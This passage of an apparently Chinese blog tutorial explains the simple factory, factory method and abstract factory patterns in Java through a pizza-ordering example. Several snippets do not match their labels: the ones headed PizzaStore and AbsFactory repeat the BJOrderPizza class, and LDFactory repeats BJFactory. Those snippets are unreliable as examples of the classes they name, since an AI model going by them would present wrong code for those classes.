class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.simplefactory.pizzastore.order;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.CheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.GreekPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.PepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.Pizza;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br><span class="hljs-comment">////    构造器</span><br><span class="hljs-comment">// public OrderPizza() &#123;</span><br><span class="hljs-comment">//    Pizza pizza = null;</span><br><span class="hljs-comment">//    String orderType; // 订购披萨的类型</span><br><span class="hljs-comment">//    do &#123;</span><br><span class="hljs-comment">//       orderType = getType();</span><br><span class="hljs-comment">//       if (orderType.equals(&quot;greek&quot;)) &#123;</span><br><span class="hljs-comment">//          pizza = new GreekPizza();</span><br><span class="hljs-comment">//          pizza.setName(&quot; 希腊披萨 &quot;);</span><br><span class="hljs-comment">//       &#125; else if (orderType.equals(&quot;cheese&quot;)) &#123;</span><br><span class="hljs-comment">//          pizza = new CheesePizza();</span><br><span class="hljs-comment">//          pizza.setName(&quot; 奶酪披萨 &quot;);</span><br><span class="hljs-comment">//       &#125; else if (orderType.equals(&quot;pepper&quot;)) &#123;</span><br><span class="hljs-comment">//          pizza = new PepperPizza();</span><br><span class="hljs-comment">//          pizza.setName(&quot;胡椒披萨&quot;);</span><br><span class="hljs-comment">//       &#125; else &#123;</span><br><span class="hljs-comment">//          break;</span><br><span class="hljs-comment">//       &#125;</span><br><span class="hljs-comment">//       //输出pizza 制作过程</span><br><span class="hljs-comment">//       pizza.prepare();</span><br><span class="hljs-comment">//       pizza.bake();</span><br><span class="hljs-comment">//       pizza.cut();</span><br><span class="hljs-comment">//       pizza.box();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    &#125; while (true);</span><br><span class="hljs-comment">// &#125;</span><br><br>   <span class="hljs-comment">//定义一个简单工厂对象</span><br>   SimpleFactory simpleFactory;<br>   <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>   <br>   <span class="hljs-comment">//构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderPizza</span><span class="hljs-params">(SimpleFactory simpleFactory)</span> &#123;<br>      setFactory(simpleFactory);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFactory</span><span class="hljs-params">(SimpleFactory simpleFactory)</span> &#123;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">orderType</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//用户输入的</span><br>      <br>      <span class="hljs-built_in">this</span>.simpleFactory = simpleFactory; <span class="hljs-comment">//设置简单工厂对象</span><br>      <br>      <span class="hljs-keyword">do</span> &#123;<br>         orderType = getType(); <br>         pizza = <span class="hljs-built_in">this</span>.simpleFactory.createPizza(orderType);<br>         <br>         <span class="hljs-comment">//输出pizza</span><br>         <span class="hljs-keyword">if</span>(pizza != <span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">//订购成功</span><br>            pizza.prepare();<br>            pizza.bake();<br>            pizza.cut();<br>            pizza.box();<br>         &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot; 订购披萨失败 &quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>         &#125;<br>      &#125;<span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">// 写一个方法，可以获取客户希望订购的披萨种类</span><br>   <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">strin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br>         System.out.println(<span class="hljs-string">&quot;input pizza 种类:&quot;</span>);<br>         <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> strin.readLine();<br>         <span class="hljs-keyword">return</span> str;<br>      &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>         e.printStackTrace();<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>      &#125;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>OrderPizza2</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.simplefactory.pizzastore.order;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.Pizza;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPizza2</span> &#123;<br><br><span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">orderType</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-comment">// 构造器</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderPizza2</span><span class="hljs-params">()</span> &#123;<br><br><span class="hljs-keyword">do</span> &#123;<br>orderType = getType();<br>pizza = SimpleFactory.createPizza2(orderType);<br><br><span class="hljs-comment">// 输出pizza</span><br><span class="hljs-keyword">if</span> (pizza != <span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">// 订购成功</span><br>pizza.prepare();<br>pizza.bake();<br>pizza.cut();<br>pizza.box();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>System.out.println(<span class="hljs-string">&quot; 订购披萨失败 &quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-comment">// 写一个方法，可以获取客户希望订购的披萨种类</span><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">BufferedReader</span> <span class="hljs-variable">strin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br>System.out.println(<span class="hljs-string">&quot;input pizza 种类:&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> strin.readLine();<br><span class="hljs-keyword">return</span> str;<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>e.printStackTrace();<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>PizzaStore</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.simplefactory.pizzastore.order;<br><br><span class="hljs-comment">//相当于一个客户端，发出订购</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PizzaStore</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//new OrderPizza();</span><br>      <br>      <span class="hljs-comment">//使用简单工厂模式</span><br>      <span class="hljs-comment">//new OrderPizza(new SimpleFactory());</span><br>      <span class="hljs-comment">//System.out.println(&quot;~~退出程序~~&quot;);</span><br>      <br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderPizza2</span>();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>执行效果</p><p>input pizza 种类:<br />greek<br />使用简单工厂模式2<br />给希腊披萨 准备原材料<br />希腊披萨  baking;<br />希腊披萨  cutting;<br />希腊披萨  boxing;<br />input pizza 种类:</p><h3 id="工厂方法模式"><a class="markdownIt-Anchor" href="#工厂方法模式"></a> <mark>工厂方法模式</mark></h3><p>看一个新的需求</p><p>披萨项目新的需求：客户在点披萨时，可以点<strong>不同口味的披萨</strong>，比如 北京的奶酪 pizza、北京的胡椒 pizza 或者是伦敦的奶酪 pizza、伦敦的胡椒 pizza。</p><ol><li><p>思路 1</p><p>使用<strong>简单工厂模式</strong>，创建<strong>不同的简单工厂类</strong>，比如 BJPizzaSimpleFactory、LDPizzaSimpleFactory 等等.从当前这个案例来说，也是可以的，但是考虑到项目的规模，以及软件的可维护性、可扩展性并不是特别好</p></li><li><p>思路 2</p><p>使用工厂方法模式</p></li></ol><blockquote><p>工厂方法模式介绍</p></blockquote><ol><li><p>工厂方法模式设计方案：将披萨项目的实例化功能抽象成抽象方法，在不同的口味点餐子类中具体实现。</p></li><li><p>工厂方法模式：<strong>定义了一个创建对象的抽象方法</strong>，由子<strong>类决定要实例化的类</strong>。工厂方法模式将<strong>对象的实例化推迟到子类</strong>。</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224165136437.png" alt="image-20221224165136437" /></p><p><strong>代码</strong></p><p><code>OrderPizza</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.factorymethod.pizzastore.order;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.Pizza;<br><br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br>   <span class="hljs-comment">//定义一个抽象方法，createPizza , 让各个工厂子类自己实现</span><br>   <span class="hljs-keyword">abstract</span> Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span>;<br>   <br>   <span class="hljs-comment">// 构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderPizza</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      String orderType; <span class="hljs-comment">// 订购披萨的类型</span><br>      <span class="hljs-keyword">do</span> &#123;<br>         orderType = getType();<br>         pizza = createPizza(orderType); <span class="hljs-comment">//抽象方法，由工厂子类完成</span><br>         <span class="hljs-comment">//输出pizza 制作过程</span><br>         pizza.prepare();<br>         pizza.bake();<br>         pizza.cut();<br>         pizza.box();<br>         <br>      &#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>);<br>   &#125;<br><br>   <br><br>   <span class="hljs-comment">// 写一个方法，可以获取客户希望订购的披萨种类</span><br>   <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">strin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br>         System.out.println(<span class="hljs-string">&quot;input pizza 种类:&quot;</span>);<br>         <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> strin.readLine();<br>         <span class="hljs-keyword">return</span> str;<br>      &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>         e.printStackTrace();<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>      &#125;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>LDOrderPizza</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.factorymethod.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.LDCheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.LDPepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.Pizza;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDOrderPizza</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br>   <br>   <span class="hljs-meta">@Override</span><br>   Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> &#123;<br>   <br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span>(orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LDCheesePizza</span>();<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LDPepperPizza</span>();<br>      &#125;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>BJOrderPizza</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.factorymethod.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.BJCheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.BJPepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.Pizza;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BJOrderPizza</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br>   <br>   <span class="hljs-meta">@Override</span><br>    Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> &#123;<br>   <br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span>(orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJCheesePizza</span>();<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJPepperPizza</span>();<br>      &#125;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>PizzaStore</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.factorymethod.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.BJCheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.BJPepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.Pizza;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BJOrderPizza</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br>   <br>   <span class="hljs-meta">@Override</span><br>    Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> &#123;<br>   <br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span>(orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJCheesePizza</span>();<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJPepperPizza</span>();<br>      &#125;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>执行效果</p><p>input pizza 种类:<br />pepper<br />北京的胡椒pizza 准备原材料<br />北京的胡椒pizza baking;<br />北京的胡椒pizza cutting;<br />北京的胡椒pizza boxing;<br />input pizza 种类:</p><h3 id="抽象工厂模式"><a class="markdownIt-Anchor" href="#抽象工厂模式"></a> <mark>抽象工厂模式</mark></h3><ol><li><p>抽象工厂模式：定义了一个 <strong>interface 用于创建相关或有依赖关系的对象簇</strong>，而无需指明具体的类</p></li><li><p>抽象工厂模式可以将简单工厂模式和工厂方法模式进行整合。</p></li><li><p>从设计层面看，抽象工厂模式就是对简单工厂模式的改进(或者称为进一步的抽象)。</p></li><li><p>将工厂抽象成<strong>两层</strong>，<strong>AbsFactory(抽象工厂)</strong> 和 <strong>具体实现的工厂子类</strong>。程序员可以根据创建对象类型使用对应的工厂子类。这样将单个的简单工厂类变成了工厂簇，更利于代码的维护和扩展。</p></li><li><p>类图</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224171144291.png" alt="image-20221224171144291" /></p><p><strong>代码</strong></p><p><code>AbsFactory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.factorymethod.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.BJCheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.BJPepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.Pizza;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BJOrderPizza</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br>   <br>   <span class="hljs-meta">@Override</span><br>    Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> &#123;<br>   <br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span>(orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJCheesePizza</span>();<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJPepperPizza</span>();<br>      &#125;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>BJFactory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.absfactory.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.BJCheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.BJPepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.Pizza;<br><br><span class="hljs-comment">//这是工厂子类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BJFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AbsFactory</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;~使用的是抽象工厂模式~&quot;</span>);<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span>(orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJCheesePizza</span>();<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>))&#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJPepperPizza</span>();<br>      &#125;<br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>LDFactory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.absfactory.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.BJCheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.BJPepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.Pizza;<br><br><span class="hljs-comment">//这是工厂子类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BJFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AbsFactory</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> 